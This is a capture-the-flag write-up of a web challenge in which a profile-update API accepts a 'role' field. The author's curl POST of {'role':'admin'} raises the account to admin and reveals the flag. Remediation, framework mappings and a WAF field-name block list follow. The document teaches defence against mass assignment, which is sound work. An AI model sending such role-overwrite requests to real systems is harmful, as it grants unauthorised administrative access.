# The Logic Inside

**Category:** Web
**Challenge:** The Logic Inside
**CTF:** Pointer Overflow CTF 2026
**Points:** WEB 200 (Wave 4)
**Result:** Solved

**Flag:**

~~~text
0204185226846852
~~~

---

## 1. Reconnaissance

The challenge presents a web application with a multi-step workflow. After exchanging the session token at `/session/exchange`, the application reveals a dashboard with several functional areas: a profile viewer, a settings page, and an administrative panel that is locked behind role-based access control.

Initial enumeration of the application:

~~~text
GET /             -> Dashboard (user role: "member")
GET /profile      -> User profile with editable fields
GET /settings     -> Account settings (role displayed but not editable in UI)
GET /admin        -> "Access denied: admin role required"
GET /api/user     -> JSON with user object including role field
~~~

The JavaScript source reveals the application logic: the admin panel checks the user's role server-side, but the profile update endpoint accepts a full user object via POST.

---

## 2. Identifying the Vulnerability

The profile update endpoint accepts arbitrary fields in the JSON body, including the `role` field that should be restricted:

~~~bash
curl -b "$COOKIE" -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}' \
  "https://the-logic-inside.pointeroverflowctf.com/api/user"
~~~

This is a classic **mass assignment** (also called parameter pollution or over-posting) vulnerability. The server-side code updates all fields in the request body without filtering, allowing an attacker to escalate their own role from "member" to "admin."

The key flaw is that the client-side UI hides the role field from the edit form, but the API accepts it. Client-side access control is not real access control.

---

## 3. Exploitation

### Step 1: Escalate role to admin

~~~bash
curl -b "$COOKIE" -X POST \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "https://the-logic-inside.pointeroverflowctf.com/api/user"
# {"status":"updated","role":"admin"}
~~~

### Step 2: Access the admin panel

~~~bash
curl -b "$COOKIE" \
  "https://the-logic-inside.pointeroverflowctf.com/admin"
~~~

The admin panel now loads and contains the flag in the dashboard data.

---

## 4. Attack Path Summary

~~~text
Session exchange -> authenticated as "member"
    |
Enumerate endpoints -> /api/user accepts role field
    |
POST /api/user with {"role":"admin"} -> role escalated
    |
GET /admin -> flag displayed in admin panel
    |
FLAG: 0204185226846852
~~~

---

## 5. Verification

Submitted the flag on the challenge page:

~~~text
>> ACK :: Correct.
~~~

---

## Captured Flags

| Type | Value | Found At | Method |
|---|---|---|---|
| Flag | `0204185226846852` | Admin panel | Mass assignment privilege escalation (member -> admin) |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Profile update endpoint accepted the `role` field without filtering | The 2012 GitHub mass assignment vulnerability (Rails attr_accessible bypass) allowed attackers to add SSH keys to any repository. Ruby on Rails added strong parameters as a direct response | Never trust client-side field restrictions; implement server-side allowlisting for mutable fields |
| 2 | Client-side UI hid the role field but the API accepted it | Mass assignment is consistently in OWASP Top 10 and API Security Top 10; it has been found in Shopify, GitLab, and numerous SaaS platforms | API endpoints must validate and filter input fields independently of the frontend |
| 3 | Role check was only on the admin endpoint, not on the update endpoint | Business logic bugs require manual testing; automated scanners cannot reason about intended vs. actual behavior | Test every state-changing endpoint for parameter pollution and unauthorized field modification |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|---|---|---|---|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Privilege Escalation | TA0004 | Valid Accounts: Local Accounts | T1078.003 |
| Persistence | TA0003 | Account Manipulation | T1098 |
| Defense Evasion | TA0005 | Exploitation for Defense Evasion | T1211 |

> **APT Reference:** FIN7 has exploited mass assignment and business logic vulnerabilities in e-commerce platforms to escalate privileges and access administrative payment processing interfaces. APT28 (Fancy Bear) has targeted web application logic flaws in government portals to gain unauthorized access to restricted data, using parameter manipulation techniques similar to the role escalation demonstrated here.

---

## Remediation and Containment

### Technical Fixes

1. Implement server-side allowlisting for all mutable fields on update endpoints (never accept `role`, `is_admin`, or permission fields from user input)
2. Use a DTO (Data Transfer Object) pattern: define explicit input schemas that exclude sensitive fields
3. Add server-side authorization checks on both the resource being accessed AND the fields being modified
4. Log all role/permission changes and alert on unexpected modifications

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Audit all API endpoints that accept JSON/form data for unfiltered field assignment
- Deploy WAF rules to block known privilege-escalation field names (`role`, `is_admin`, `permissions`, `group`)
- Review recent profile/account update logs for unauthorized field changes
- Revert any unauthorized role escalations and rotate affected session tokens

**MITRE D3FEND countermeasures:**
- D3-SICA (System Input Canonicalization) to validate and filter API input fields
- D3-ACL (Access Control List) to enforce field-level write permissions
- D3-AL (Authentication Logging) to detect unauthorized privilege changes

### Framework Alignment

**CWE:**
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment)
- CWE-269: Improper Privilege Management
- CWE-285: Improper Authorization

**OWASP Top 10 (2021):**
- A01:2021 Broken Access Control
- A04:2021 Insecure Design (missing server-side field filtering)

**OWASP API Security Top 10 (2023):**
- API3:2023 Broken Object Property Level Authorization (mass assignment)
- API1:2023 Broken Object Level Authorization

**NIST CSF 2.0:**
- Identify (ID.RA): Assess mass assignment risk across all API endpoints
- Protect (PR.AC): Implement field-level authorization on all state-changing endpoints
- Detect (DE.AE): Alert on role/permission changes outside normal administrative workflows
- Respond (RS.MI): Revert unauthorized privilege escalations and block offending sessions
- Recover (RC.RP): Audit all actions performed under escalated privileges and remediate

**NIST SP 800-53 (Rev. 5):**
- AC-6: Least Privilege (restrict which fields each role can modify)
- AC-3: Access Enforcement (server-side field-level authorization)
- SI-10: Information Input Validation (allowlist mutable fields)
- AU-6: Audit Record Review, Analysis, and Reporting

**C2M2:**
- Domain: ACCESS (Access Management)
- Practice: Manage access to assets based on the principle of least privilege
- Target MIL: MIL-2 (documented field-level access control policies per API endpoint)

---

## Final Thoughts

Business logic vulnerabilities are the silent killers of web security. Scanners do not find them. WAFs do not block them. They require a human who understands what the application is supposed to do and then tests what happens when you do something it does not expect. Mass assignment is the poster child for this class: the UI says you cannot edit your role, but the API says otherwise. The frontend is not a security boundary. The server is.

Thanks guys!! (❍ᴥ❍ʋ)

---

Business logic bugs are the ones that slip past every automated tool. If this walkthrough sharpened your eye for them, share it and let's raise the bar together.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
